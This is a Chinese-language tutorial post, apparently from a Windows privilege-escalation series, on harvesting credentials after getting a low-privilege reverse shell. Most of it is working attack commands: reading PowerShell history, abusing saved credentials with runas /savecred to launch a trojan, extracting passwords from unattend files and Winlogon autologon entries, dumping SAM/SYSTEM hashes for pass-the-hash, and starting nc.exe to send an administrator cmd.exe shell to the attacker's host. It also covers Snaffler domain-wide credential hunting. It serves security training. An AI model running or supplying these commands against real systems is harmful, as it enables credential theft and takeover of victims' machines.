---
title: Windows提权4：凭据大搜刮与敏感文件
date: 2026-03-21 10:00:00
tags:
- 提权
- Windows
- 敏感信息收集
categories:
- ISW
- Windows提权
---

核心思想：管理员也是人，是人就会犯错
==================

在拿到一个低权限的 **反弹shell** 后，第一个要干的就是一个一个查下面有没有满足条件的敏感信息泄露



# 实战：

## 一、 PowerShell 历史记录

Linux 有 `.bash_history`，Windows 同样有 `ConsoleHost_history.txt`。管理员在排查问题时，经常会用 PowerShell 临时连一下数据库或其它主机，密码往往就明文留在里面。

### 搜刮命令

在命令行中直接读取当前用户的历史记录（也可以去查其他你拥有读取权限的用户的文件夹）：

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  # cmd
type $env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt # powershell
```

_(注：`%userprofile%` 环境变量会自动指向当前用户的家目录，比如 `C:\Users\s0m1ng`)_

### 输出观察

如果你在输出中看到了类似这样的代码，直接就结束了

```bash
$password = ConvertTo-SecureString "Admin@ISW2026!" -AsPlainText -Force
net use \\10.0.0.5\c$ /user:Administrator "Admin@ISW2026!"
```



二、 凭据管理器与 RunAs 利用(记住密码)
-------------------------

Windows 有一个凭据管理器。如果管理员在登录某些服务时勾选了“记住密码”，这些凭据就会被系统妥善保存。

### 查看保存的凭据

```bash
cmdkey /list
```

**重点关注**：回显中是否有 `Target: Domain:interactive=WORKGROUP\Administrator` 这样的高权限账号凭据。

### 实战利用：RunAs /savecred (神仙连招)

如果你发现系统保存了 Administrator 的凭据，你**不需要知道密码的具体明文**，可以直接命令系统“用保存的密码”以 Administrator 的身份去执行你的木马

```bash
# 假设你的木马已经传到了 C:\Windows\Temp\Enterprise.exe
runas /savecred /user:Administrator "C:\Windows\Temp\Enterprise.exe"
```

_敲下回车后，你的 Ubuntu 监听端 (`nc -lvnp 4444`) 就会直接弹回一个 Administrator 权限的 Shell_



三、 无人值守应答文件(Unattend.xml)
--------------------------

在企业环境中，管理员经常使用“无人值守应答文件”来批量自动重装 Windows 系统。文件里包含了系统初始化时的所有配置，包括**新创建的本地管理员密码**。

### 常见搜刮路径

用 `dir` 配合 `/s` (递归搜索) 去这几个地方找找：

```bash
dir /s /b C:\Windows\Panther\*.xml
dir /s /b C:\Windows\System32\sysprep\*.xml
```

_常见文件名：`Unattend.xml`, `autounattend.xml`_

### 密码提取与解码

用 `type` 命令查看文件内容，直接全局搜索 `<Password>` 或 `<AdministratorPassword>` 标签。你会发现密码通常长这样：`cGFzc3dvcmQxMjM=` 

这通常是 Base64 编码，甚至有时只是简单的明文。

拿到明文密码后，配合前面的 `RunAs` 或者后面要学的内网横向工具直接登录。

**但是这个要注意：windows和linux最不一样的点来了**，linux拿到明文密码后可以直接su root，因为我们反弹shell到靶机可以升级我们的shell，所以su不会卡死在输入密码的部分

但是windows没有pyt这个python模块，没法升级。所以我们输入：` runas /user:Administrator cmd.exe` 屏幕上确实会显示“`请输入 Administrator 的密码：`”，但此时由于底层输入流（STDIN）的限制，你敲键盘是输不进去密码的，最后只能卡死或者报错退出来。



**解决方法：**

* **方法一：从 Ubuntu 攻击机直接正向连接**
  
  既然有了账号密码，就不需要在破烂的反弹 Shell 里挣扎了。直接在你的 Ubuntu 终端里用 Impacket 工具包远程登录靶机，瞬间获取一个完美的 SYSTEM 级交互式 Shell：
  
  ```bash
  # 使用 psexec.py 登录（密码建议用单引号包裹防转义）
  impacket-psexec Administrator:'Admin@123'@靶机的IP
  ```

* **方法二：在当前 Shell 中用 PowerShell 提权执行** 
  
  如果你无法从外部直接连接靶机（比如靶机藏在内网深处），你需要用 PowerShell 把明文密码转换成“安全凭据对象”，然后以管理员身份执行你的反弹木马（如 `nc.exe`）：
  
  ```bash
  # 1. 启动 PowerShell
  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
  
  # 2. 将明文密码转为安全字符串并创建凭据
  $pass = ConvertTo-SecureString 'Admin@123' -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
  
  # 3. 带凭据静默启动 nc.exe 反弹 Shell 给 Ubuntu
  Start-Process -FilePath "C:\Windows\Temp\nc.exe" -ArgumentList "你的UbuntuIP 4444 -e cmd.exe" -Credential $cred
  ```





四、 注册表中的自动登录密码
--------------------------

为了让服务器重启后能自动进入桌面运行某些业务程序，管理员会在注册表中配置“自动登录”，这里的密码是**绝对的明文**。

### 查询命令

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

### 观察点

仔细看回显，如果同时存在以下三个键值，就是我们想要的：

* `DefaultUserName` (用户名)

* `DefaultDomainName` (域名)

* `DefaultPassword` (**明文密码**)







五、 SAM 与 SYSTEM 提取 (内网横向的桥梁)
------------------------------

如果你翻遍了所有明文都没找到，最终的招数就是提取 Windows 最底层的密码哈希库。

### 1. 绕过死锁导出文件

```bash
reg save HKLM\sam C:\Windows\Temp\sam.save
reg save HKLM\system C:\Windows\Temp\system.save
```

### 2. 离线提取 Hash

将这两个文件下载到 Ubuntu 后，使用 `secretsdump.py` 榨干它们：

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

拿到 NTLM Hash 后，即可用于后续的内网横向传递 (PtH)。







六、 自动化扫描敏感信息：WinPEAS & Snaffler
-----------------------------

实战中如果手动翻文件太慢，直接丢脚本

**WinPEAS**：运行后重点看 `Credentials` 和 `Files Information` 标红的部分。

**Snaffler**：这是一个专门用来在 Windows 机器和内网共享文件夹里疯狂寻找密码、凭证、私钥的红队工具（C# 编写）
**Snaffler 实战获取与执行流程：**

1. **下载 (在你的 Ubuntu 中)**：去 GitHub Releases 页面下载编译好的 exe。
   
   ```bash
   wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.184/Snaffler.exe
   ```

2. **传到靶机**：通过 `python3 -m http.server` 配合靶机的 `wget` 或 `certutil` 下载到靶机的 `C:\Windows\Temp\`。

3. **执行扫描**：
   
   - 如果是单机搜刮目录：`C:\Windows\Temp\Snaffler.exe -i C:\ -s -o C:\Windows\Temp\results.txt` (`-i` 指定目录，`-s` 打印到屏幕，`-o` 导出文件)。
   
   - 如果是域内共享搜刮：`Snaffler.exe -d 域名.com -s -v data`。




